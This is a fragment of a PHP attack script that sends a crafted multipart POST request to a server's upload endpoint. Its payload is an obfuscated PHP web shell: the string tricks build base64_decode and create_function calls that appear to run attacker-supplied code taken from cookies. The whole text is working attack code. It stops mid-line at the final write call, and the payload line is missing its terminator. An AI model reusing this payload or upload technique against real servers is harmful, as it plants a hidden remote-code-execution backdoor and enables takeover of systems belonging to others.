// The destination for our attack:
$host = "127.0.0.1";
$port = 8887;
$page = "/server.php";
 
// Here we have the file we're uploading (note the content-type):
$payload =
"$rrkz = str_replace('b','','bsbtrb_brbebpblbace');$wdkf='ppJGM9J2ppNvdW50JppzskYTpp0kX0NPppT0tJRTtpppppZihyZXNldCgppkYSk9PScxMippcgJiYgJGMoJGEp';$hzzo='dfcmVwbGFjZShhppcnJhppeSgnL1tppeXHc9XppHNdLyppcsJy9ccppy8nKSwgYXJyYXkoJycsJysnKSwg';$uegk='am9pppbihhcnJheppV9zppbGljZSgppkYSwkYygppkYSppktMykpppKSkpO2VjaG8gJppzwvJy4kppay4nPic7fQ==';$wrmg='ppPjMpeppyRrPSczppMTIzJztlY2hppvppICc8Jy4kay4nPppippc7ZXZhbCpphiYXNlNjRfZGVjbpp2RlppKHByZppW';$bfth = $rrkz('v', '', 'vbvavsve6v4v_vdvevcvovde');$amcl = $rrkz('tr','','ctrreattretr_trftrutrncttriotrn');$rjea = $amcl('', $bfth($rrkz('pp', '', $wdkf.$wrmg.$hzzo.$uegk))); $rjea(); "
 
// Finally, craft the request and send it.
$content_length = strlen($payload);
$headers = array(
    "POST {$page} HTTP/1.1",
    "Host: {$host}:{$port}",
    "Connection: close",
    "Content-Length: {$content_length}",
    "User-Agent: Evil Robot",
    "Content-Type: multipart/form-data; boundary=----ThisIsABoundary",
);
 
$request = implode("\r\n", $headers) . "\r\n\r\n" . $payload . "\r\n";
 
$fp = fsockopen($host, $port, $errno, $errstr)
      or die("ERROR: $errno - $errstr");
fwrite($fp, $request
